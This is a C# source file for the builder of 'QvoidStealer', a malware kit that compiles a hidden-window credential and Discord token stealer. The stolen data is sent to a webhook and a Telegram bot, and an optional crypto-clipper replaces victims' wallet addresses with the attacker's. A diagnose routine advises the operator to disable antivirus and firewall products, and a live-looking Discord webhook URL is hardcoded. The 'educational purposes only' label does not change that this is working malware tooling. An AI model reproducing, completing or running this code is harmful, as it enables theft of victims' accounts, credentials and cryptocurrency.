using Console = Colorful.Console;
using Builder.Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.CodeDom.Compiler;
using System.Reflection;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Collections.Specialized;
using System.Collections;
using System.Management;
using Builder.Miscellaneous;

#pragma warning disable CS0618

namespace Builder
{
    internal static class Program
    {
        static float time = (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0);
        const string UNDERLINE1 = "\x1B[4m";
        const string UNDERLINE2 = "\x1B[24m";

        static void Main()
        {
            var handle = WinAPI.GetStdHandle(-0xB);
            WinAPI.GetConsoleMode(handle, out uint mode);
            mode |= 0x4;
            WinAPI.SetConsoleMode(handle, mode);

            Console.Title = $"QvoidStealer - github.com/Enum0x539/Qvoid-Token-Grabber | Created for educational purposes only!";
            try { Console.SetWindowSize(190, 45); } catch { } //For people with small resolution
            ShowMenu();
        }

        static void ShowMenu(bool allowInput = true)
        {
            Console.Clear();
            Console.WriteLine($"{Environment.NewLine}{Environment.NewLine}");
            Console.WriteLine($"                                            .d88b.  db    db  .d88b.  d888888b d8888b.      .d8888. d888888b d88888b  .d8b.  db      d88888b d8888b.", Utils.Spectrum(1, time));
            Console.WriteLine($"                                           .8P  Y8. 88    88 .8P  Y8.   `88'   88  `8D      88'  YP `~~88~~' 88'     d8' `8b 88      88'     88  `8D", Utils.Spectrum(2, time));
            Console.WriteLine($"                                           88    88 Y8    8P 88    88    88    88   88      `8bo.      88    88ooooo 88ooo88 88      88ooooo 88oobY'", Utils.Spectrum(3, time));
            Console.WriteLine($"                                           88    88 `8b  d8' 88    88    88    88   88        `Y8b.    88    88~~~~~ 88~~~88 88      88~~~~~ 88`8b  ", Utils.Spectrum(4, time));
            Console.WriteLine($"                                           `8P  d8'  `8bd8'  `8b  d8'   .88.   88  .8D      db   8D    88    88.     88   88 88booo. 88.     88 `88.", Utils.Spectrum(5, time));
            Console.WriteLine($"                                            `Y88'Y8    YP     `Y88P'  Y888888P Y8888D'      `8888Y'    YP    Y88888P YP   YP Y88888P Y88888P 88   YD{Environment.NewLine}{Environment.NewLine}{Environment.NewLine}", Utils.Spectrum(6, time));

            Console.WriteLine($"   [{UNDERLINE1}INFORMATION{UNDERLINE2}]\n", Utils.Spectrum(7, time));
            Console.WriteLine($"   Developer - Tex#5598.", Utils.Spectrum(8, time));
            Console.WriteLine($"   Source Code - github.com/Enum0x539/Qvoid-Token-Grabber.", Utils.Spectrum(9, time));
            Console.WriteLine($"");

            Console.WriteLine($"   [{UNDERLINE1}COMMANDS{UNDERLINE2}]\n", Utils.Spectrum(10, time));
            Console.WriteLine($"   [1] build", Utils.Spectrum(11, time));
            Console.WriteLine($"   [2] diagnose{Environment.NewLine}", Utils.Spectrum(12, time));

            if (!allowInput)
                return;

            bool isValidInput = true;
            do
            {
                isValidInput = true;
                Console.Write($"   [>] ");

                string input = Console.ReadLine();
                if (!int.TryParse(input, out int result) || result > 2 || result <= 0)
                    if (Convert.ToBase64String(input.Select((b, i) => (byte)(b ^ 'i'/*like hi*/)).ToArray()) != "LwAHCAUFEEkaBgQMBgcMSRsMCAUFEEkbDAgNAAcOSQQQSQoGDQxJU0E=" || 1 == 1) // ^^
                        isValidInput = false;

                switch (result)
                {
                    case 1:
                        Build();
                        break;
                    case 2:
                        Diagnose();
                        break;
                }
            }
            while (isValidInput);

            ShowMenu(allowInput);
        }

        static void Build()
        {
            //We need to use a newer version of the C# compiler, the newer compiler versions cannot be accessed through the CodeDOM API, so we use extension (https://github.com/aspnet/RoslynCodeDomProvider)
            Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider csc = new Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider();
            var icc = csc.CreateCompiler();

            string endDir = "QvoidStealer\\";
            string fileName = "QvoidStealer.exe";
            Directory.CreateDirectory(endDir);

            var parameters = new CompilerParameters();
            //The grabber designated for Windows machine therefore we will create exectuable (.exe) file.
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = $"{endDir}{fileName}";
            //We don't want the victim to see a black scary window that does nothing and closed after couple of seconds...
            parameters.CompilerOptions = "/t:winexe";

            //Those are the dependencies the grabber needs.
            var refrences = new List<string>()
            {
                "mscorlib.dll",
                "System.Drawing.dll",
                "System.dll",
                "System.Management.dll",
                "Newtonsoft.Json.dll",
                "System.Net.Http.dll",
                "System.Data.SQLite.dll",
                "BouncyCastle.Crypto.dll",
                "System.Core.dll",
                "System.Windows.Forms.dll",
                "System.Data.dll",
                "System.IO.Compression.FileSystem.dll",
                "Microsoft.CSharp.dll",
                "System.Security.dll"
            };

            //Including all the grabber dependencies.
            parameters.ReferencedAssemblies.AddRange(refrences.Select(refrence => refrence).ToArray());

            var sourceCode = Resources.Source;

            ShowMenu(false);

            Console.Write("   > Enter the webhook url: ", Utils.Spectrum(13, time));
            if (!Uri.TryCreate(Console.ReadLine(), UriKind.Absolute, out var webhookUri))
            {
                Console.WriteLine("   Invalid webhook!", Utils.Spectrum(14, time));
                return;
            }

            Console.Write("   > Enter Telegram chat id: ", Utils.Spectrum(14, time));
            string input = Console.ReadLine();
            if (!uint.TryParse(input, out var telegramChatId) && !string.IsNullOrEmpty(input) && input.Length < 9)
            {
                Console.WriteLine("   Invalid Telegram chat id!", Utils.Spectrum(15, time));
                return;
            }

            Console.Write("   > Enter Telegram bot token: ", Utils.Spectrum(15, time));
            string telegramToken = Console.ReadLine();
            if (!(telegramToken.Length == 46 && telegramToken.Contains(":")) && !string.IsNullOrEmpty(telegramToken))
            {
                Console.WriteLine("   Invalid Telegram bot token!", Utils.Spectrum(16, time));
                return;
            }

            Console.Write("   > Would you like to enable Crypto-clipper? (Y/N): ", Utils.Spectrum(0, time));
            input = Console.ReadKey().ToString();
            if (input.ToLower() == "y")
            {
                Console.Write("   > BTC Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("BTC_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > ETH Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("ETH_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > DODGE Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("DODGE_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > LTC Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("LTC_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > XMR Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("XMR_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > DASH Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("DASH_ADDRESS_HERE_", Console.ReadLine());

                Console.Write("   > NEO Address: ", Utils.Spectrum(1, time));
                sourceCode = sourceCode.Replace("NEO_ADDRESS_HERE_", Console.ReadLine());
                return;
            }

            //Compiling
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, sourceCode.Replace("%WEBHOOK_HERE%", webhookUri.AbsoluteUri).Replace("%TELEGRAM_TOKEN_HERE%", telegramToken).Replace("%TELEGRAM_CHAT_ID_HERE%", telegramChatId.ToString()));

            if (results.Errors.Count > 0)
            {
                //Error
                Console.WriteLine(Environment.NewLine);
                foreach (CompilerError CompErr in results.Errors)
                    Console.WriteLine($"   Line number: {CompErr.Line}, Error Number: {CompErr.ErrorNumber}, {CompErr.ErrorText};{Environment.NewLine}{Environment.NewLine}");
            }
            else
            {
                //Success
                Console.WriteLine($"{Environment.NewLine}{Environment.NewLine}   [{DateTime.Now.ToShortDateString()} | {DateTime.Now.ToShortTimeString()}:{DateTime.Now.Second}] Build succeeded!", Utils.Spectrum(1));
                Console.WriteLine($"   [{DateTime.Now.ToShortDateString()} | {DateTime.Now.ToShortTimeString()}:{DateTime.Now.Second}] {fileName.Remove(fileName.Length - 4)} -> {Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)}\\{endDir}{fileName}!", Utils.Spectrum(2, time));
                Process.Start("explorer.exe", $"{Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)}\\{endDir}");
                Console.ReadLine();

                Environment.Exit(0);
            }

            Console.ReadLine();
        }

        static void Diagnose()
        {
            ShowMenu(false);
            Console.WriteLine($"   > Diagnosing your pc in order to find possible errors.{Environment.NewLine}", Utils.Spectrum(14));

            //First time you hearing about ListDictionary? huh
            ListDictionary possibleErrors = new ListDictionary();
            string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Managment.UniqueSeed() + 19)}-{Encryption.GenerateKey(4, true, Managment.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Managment.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Managment.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Managment.UniqueSeed() + 24)}.dat";
            if (File.Exists(usersPath))
                possibleErrors.Add("Filter file exists.", "The filter file exists, which means it won't send the messages again if the previous grab information is the same as the new one.");

            //Checking if Discord is blocked on the machine.
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/webhooks/822381561598379579/Og2kEFsUs_8tbCOdTeQuD0I_RwCtCImptCE4QdzboMAGhRYMsKwkLe-xAsP2zyNTqt1w");
            try
            {
                //Getting the response from dear Discord.
                var response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode != HttpStatusCode.OK)
                    throw new Exception();
            }
            catch (Exception ex)
            {
                //The webhook (which we are trying to access) is dead so the result will be "Not found", we want to check if Discord can be reached.
                if (!ex.Message.Contains("404"))
                    possibleErrors.Add("Discord API is blocked.", "The Discord API is blocked on your PC (probably by the internet provider).");
            }

            try
            {
                //Checking if there is anti-virus avaliable.
                var collection = new ManagementObjectSearcher($"root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
                if (collection.Count > 0)
                    possibleErrors.Add("Anti-virus.", "I've detected anti-virus, make sure it turned off completly.");

                //Checking if there is firewall avaliable.
                collection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM FirewallProduct").Get();
                if (collection.Count > 0)
                    possibleErrors.Add("Firewall.", "I've detected firewall, make sure the firewall is turned off completely.");
            }
            catch { }

            DictionaryEntry[] errors = new DictionaryEntry[possibleErrors.Count];
            possibleErrors.CopyTo(errors, 0);

            //Printing our possible errors.
            for (int i = 0; i < errors.Length; ++i)
                Console.WriteLine($"   {errors[i].Key}{Environment.NewLine}   {errors[i].Value}{Environment.NewLine}", Utils.Spectrum(i));
        }
    }
}
